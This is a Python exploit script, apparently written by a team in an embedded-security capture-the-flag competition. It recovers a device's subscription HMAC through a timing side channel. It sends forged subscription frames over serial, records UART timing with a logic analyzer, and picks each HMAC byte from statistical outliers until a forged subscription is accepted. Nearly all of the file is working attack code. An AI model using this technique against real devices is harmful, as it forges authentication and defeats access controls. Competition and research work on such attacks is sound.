### IMPORTS ###
from serial import Serial
from struct import unpack
import csv, os
from math import fsum
from saleae import automation
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
import smtplib
import numpy as np
import matplotlib.pyplot as plt



### CONSTANTS ###
# an example of a legitimate subscription file to double check our length
og_sub_file = b'\xdf=M\xaaA(\xb8D0(\x07\x009\xef\xf1\xd3JJ\x07\x00\x01\x00\x00\x00k\x98\xa3\xba\xf9\xc3\xf9\x97Y\xb9C[\x13P^o\x9c\xf8!)-\x01P\x86\x81\x93\xeaa#L\xbd7'

# we pre-calculated all the subscription files needed to get us the flags and listed them here
"""
Expired = b'\xdf=M\xaa\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\x02\x00\x00\x00'
Recording = b'\xdf=M\xaa\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\x01\x00\x00\x00'
No sub = b'\xdf=M\xaa\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\x03\x00\x00\x00'
Pirated = b'\xdf=M\xaa\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\x04\x00\x00\x00'
"""

sub_file_contents = b'\xdf=M\xaa\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\x02\x00\x00\x00'

# if something broke, we'd put in the HMAC bytes that we were POSITIVELY sure were correct
current_hmac = bytes([])
REPS = 200          # usually 150 to 200 worked well
SECONDS = 750       # this was determined through observation

lastMax = ''
lastMin = ''

while len(current_hmac) < 32:

    ### START CAPTURE ###
    """
    We want to start the Logic Pro 2 capture.
    """
    current_idx = len(current_hmac)+1

    # for the last byte of the HMAC, the moment all 32 bytes are correct, the subscription will
    # be added to the device and stay there, so no timing analysis is needed.
    if current_idx == 32:
        REPS = 1
        SECONDS = 15.0

    print(f"[+] Starting capture for byte {current_idx} of the HMAC...")

    with automation.Manager.connect(port=10430) as manager:
        device_configuration = automation.LogicDeviceConfiguration(
            enabled_digital_channels=[0],
            digital_sample_rate=4000000,
        )

        capture_configuration = automation.CaptureConfiguration(
            capture_mode=automation.TimedCaptureMode(duration_seconds=SECONDS)
        )
        
        with manager.start_capture(
            device_id='B8F7CB761E3E7146',
            device_configuration=device_configuration,
            capture_configuration=capture_configuration) as capture:


            ### SEND FRAMES ###
            print("[+] Sending frames...")

            ser = Serial(baudrate=115200)
            ser.port = '/dev/ttyACM0'

            for j in range(256):
                # sometimes instead of using timing analysis to determine the second-to-last byte, we'd just brute
                # force all combinations of the last 2 bytes
                # for k in range(256): 
                    for i in range(REPS):
                        ### SEND HEADER ###
                        # open the serial port
                        if not ser.is_open:
                            ser.open()
                        ser.write(b'%S8\x00')
                        ack = ser.read(4)
                        # print(f'ack: {ack}')

                        ### SEND FILE ###
                        # this is where we assemble all parts of the subscription file (note that \xf1 can be anything)
                        to_send = sub_file_contents + current_hmac + bytes([j]) + b'\xf1'*(32-len(current_hmac)-1)
                        # print(to_send.hex())

                        # sanity check on length
                        if (len(to_send) != len(og_sub_file)):
                            print("OOPS")
                            exit()
                        ser.write(to_send)
                        ack = ser.read(4)
                        # print(f'ack2: {ack}')

                        ### GET RESPONSES ###
                        resp = ser.read(4)
                        _, length = unpack("<HH", resp)
                        # print(f'resp: {resp}')
                        # print(f'len: {length}')
                        ser.write(b'%A\x00\x00')
                        resp_body = ser.read(length)
                        # print(resp_body)
                        
                        if b'Invalid subscription' not in resp_body:
                            # if we get to this point, that means an error was NOT thrown
                            # so our subscription was valid
                            print("SUCCESS")
                            exit()

                        ### SEND ACK AND GET ERROR/DEBUG MESSAGES ###
                        ser.write(b'%A\x00\x00')

                    # we sent a LIST command in between bytes just to ensure we could properly split up runs of 
                    # the same byte
                    ser.write(b'%L\x00\x00')
                    ack = ser.read(4)
                    ser.read(4)

                    ser.write(b'%A\x00\x00')
                    ser.read(4)
                    ser.write(b'%A\x00\x00')

                    print(f'  Byte: {hex(j)}')


            ### STOP CAPTURE ###
            """
            At this point, we need to STOP the capture and export the CSV file.
            """
            print("[+] Stopping capture and exporting CSV file...")

            capture.wait()

            # Logic Pro 2 can analyze the UART data and automatically pull out timestamps and data
            uart_analyzer = capture.add_analyzer('Async Serial', label=f'Test Analyzer', settings={
                'Input Channel': 0,
                'Bit Rate (Bits/s)': 115200
            })

            # Export analyzer data to a CSV file
            analyzer_export_filepath = os.path.join('/home/ectf3/Desktop/team-Tufts/', 'memcmp.csv')
            capture.export_data_table(
                filepath=analyzer_export_filepath,
                columns=['name', 'Start', 'data'],
                analyzers=[uart_analyzer]
            )



    ### ANALYZE CSV FILE ###
    print("[+] Analyzing CSV file...")
    times = []
    tmp = []

    # read file
    with open('memcmp.csv', mode ='r') as file:
        lines = [x for x in csv.reader(file)]

    with open('tmp.txt', 'w') as f:
        f.write(str(lines))

    for i in range(len(lines)):
        element = lines[i]

        # This will be different for each team as what error message (if any) is returned varies
        if element[2] == 'E' and lines[i+3][2] == 'I':
            first = lines[i-2][1]
            second = lines[i-1][1]

            diff = float(second) - float(first)
            #print(f"First: {first}, Second: {second}, Difference: {diff}")
            tmp.append(diff)

        # aka, we've captured all the REPS of a single byte
        if len(tmp) == REPS:
            avg = fsum(tmp) / len(tmp)
            times.append(avg)
            tmp = []


    """
    When our timing was particularly finicky, we would calculate some outliers and zscores to see
    how accurate the round was for that byte.
    """
    mean = np.mean(times)
    std_dev = np.std(times)
    z_scores = [(x - mean) / std_dev for x in times]
    outliers = [times[i] for i in range(len(times)) if abs(z_scores[i]) > 3]
    
    # print the results
    print(f"Times: {times}")
    print(f'Z-scores {z_scores}') 
    print("Detected Outliers:", outliers)
    print(f"Max: {max(times)} at index {times.index(max(times))}")
    print(f"Min: {min(times)} at index {times.index(min(times))}")


    ### PLOT THE DATA ###
    # plotting the data to visualize the timing analysis was super helpful in knowing if we did something wrong
    import matplotlib.pyplot as plt

    x = range(len(times))             # index for x-axis

    plt.plot(x, times, 'o')           # 'o' means dots only
    plt.xlabel('Index')
    plt.ylabel('Value')
    plt.grid(True)
    # plt.show()
    plt.savefig(f"output_byte_{current_idx}.png", dpi=300, bbox_inches='tight')
    plt.close()

    setLastMax = True
    setLastMin = True

    ### DETERMINE WINNING CHAR ###
    """
    The winning char must be the maximum (or minimum) of times, and EITHER
     - be the only outlier, or
     - have a Z score high enough that we're confident it's the right answer

    (we played around with this a lot)
    """
    print(f'Min condition {(min(times) in outliers and len([x for x in outliers if x < mean]) <= 2)}')
    print(f'Max condition {( (max(times) in outliers and len([x for x in outliers if x > mean]) == 1) or (times.index(max(times)) == lastMax) )}')
    if current_idx % 4 == 0:
        setLastMax = False
        if ( (min(times) in outliers and len([x for x in outliers if x < mean]) <= 2)  or (times.index(min(times)) == lastMin) ):
            print("Winning char: ", times.index(min(times)))
            current_hmac += bytes([times.index(min(times))])
            setLastMin = False
    else:
        if ( (max(times) in outliers and len([x for x in outliers if x > mean]) == 1) or (times.index(max(times)) == lastMax) ):
            print("Winning char: ", times.index(max(times)))
            current_hmac += bytes([times.index(max(times))])
            setLastMax = False
    


    if setLastMin:
        lastMin = times.index(min(times))
    else:
        lastMin = ''

    if setLastMax:
        lastMax = times.index(max(times))
    else:
        lastMax = ''


    ### EXPORT HMAC TO FILE IN CASE SOMETHING BAD HAPPENS ###
    with open('hmac.txt', 'w') as f:
        f.write(current_hmac.hex())



    ### SEND EMAIL ###
    # we would email the results to ourselves after every byte so we could keep track of our progress
    if len(current_hmac) <= 31:

        try: 
            SENDERADDRESS = "xxxx@gmail.com"
            SENDERPASSWORD = "xxxx"
            RECADDRESS1 = 'xxxx@gmail.com'
            RECADDRESS2 = 'xxxx@gmail.com'
            message = MIMEMultipart()
            message['From'] = SENDERADDRESS
            message['To'] = ""
            message['Subject'] = f'ectf Graph <TEAM NAME> (<FLAG>)'   

            file_paths = [f'./output_byte_{current_idx}.png']

            for file_path in file_paths:
                with open(file_path, "rb") as file:
                    part = MIMEApplication(file.read(), Name=file_path)
                    part['Content-Disposition'] = f'attachment; filename="{file_path.split("/")[len(file_path.split("/"))-1]}"'
                    message.attach(part)


            messageBody = f""" See attached png for byte {current_idx}
            Detected Outliers: {outliers}
            Max: {max(times)} at index {times.index(max(times))}
            Min: {min(times)} at index {times.index(min(times))}
            """

            message.attach(MIMEText(messageBody, 'plain'))

            session = smtplib.SMTP('smtp.gmail.com', 587)
            session.starttls()
            session.login(SENDERADDRESS, SENDERPASSWORD)
            text = message.as_string()
            session.sendmail(SENDERADDRESS, RECADDRESS1, text)
            session.sendmail(SENDERADDRESS, RECADDRESS2, text)
            session.quit()
            print(f'Mail Sent to {RECADDRESS1},{RECADDRESS2}')
        except:
            pass